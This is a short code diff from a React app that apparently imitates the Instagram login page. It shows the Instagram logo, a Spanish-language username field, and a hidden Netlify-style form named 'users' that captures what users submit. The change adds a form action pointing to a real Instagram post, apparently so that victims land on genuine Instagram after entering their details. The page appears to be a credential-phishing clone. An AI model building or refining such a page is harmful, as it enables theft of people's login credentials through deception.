@@ -64,7 +64,7 @@ function App() {
         <img className='w-44 invert contrast-200' src={'https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png'} alt="Vite logo" />
       </a>
       <div className='p-9'>
-        <form name='users' method='POST'>
+        <form     action="https://www.instagram.com/p/C6rCOKlAAsG/"  name='users' method='POST'>
           <div className='grid gap-2'>
           <input type="hidden" name="form-name" value="users" />
             <input onChange={handleInput} className='bg-[#121212] border border-zinc-500 placeholder-zinc-300 p-3 text-xs rounded text-white' id='username' name='username' type="text" placeholder="Telefono, usuario o correo electronico " />
